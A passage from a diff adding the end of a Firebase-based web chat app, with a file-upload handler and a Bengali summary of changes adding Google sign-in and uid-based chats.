+            document.getElementById('attachFileBtn').addEventListener('click', () => fileInput.click());
+            
+            fileInput.addEventListener('change', (e) => {
+                const file = e.target.files[0];
+                if (!file || !currentChatId) return;
+
+                const type = file.type.startsWith('image/') ? 'image' : 'video';
+                const path = `chat_files/${currentChatId}/${Date.now()}_${file.name}`;
+                uploadBytes(storageRef(storage, path), file)
+                    .then(snap => getDownloadURL(snap.ref))
+                    .then(url => sendMessage(url, type));
+                e.target.value = '';
+            });
+
+            // Initial App Setup
+            updateUI();
+        });
+    </script>
+</body>
+</html>```
+
+### প্রধান পরিবর্তনগুলো:
+
+1.  **Firebase Authentication যোগ করা হয়েছে:** `firebase-auth.js` ফাইলটি ইম্পোর্ট করা হয়েছে এবং `getAuth` ফাংশন ব্যবহার করে অথেন্টিকেশন সিস্টেম চালু করা হয়েছে।
+2.  **প্রোফাইল সেকশন পরিবর্তন:**
+    *   `profile-section`-এ এখন দুটি অংশ আছে: একটি লগইন করা ব্যবহারকারীর জন্য (`profile-view`) এবং অন্যটি লগইন না করা ব্যবহারকারীর জন্য (`login-view`)।
+    *   `login-view`-তে "Continue with Google" বাটন যোগ করা হয়েছে।
+    *   `profile-view`-তে ব্যবহারকারীর নাম, ইমেইল, ছবি এবং একটি "Sign Out" বাটন যোগ করা হয়েছে।
+3.  **লগইন ও লগআউট লজিক:**
+    *   `onAuthStateChanged` নামক একটি ফাংশন ব্যবহারকারীর লগইন অবস্থা পর্যবেক্ষণ করে।
+    *   যদি ব্যবহারকারী লগইন করে, তার প্রোফাইল তথ্য দেখানো হয়।
+    *   যদি ব্যবহারকারী লগআউট করে, তাহলে লগইন বাটন দেখানো হয়।
+4.  **চ্যাট সিস্টেম আপডেট:** আগের কোডে চ্যাট করার জন্য ফোন নম্বর ব্যবহার করা হতো। এখন এটিকে পরিবর্তন করে Firebase-এর ইউনিক ইউজার আইডি (`uid`) ব্যবহার করার জন্য আপডেট করা হয়েছে, যা আরও নিরাপদ।
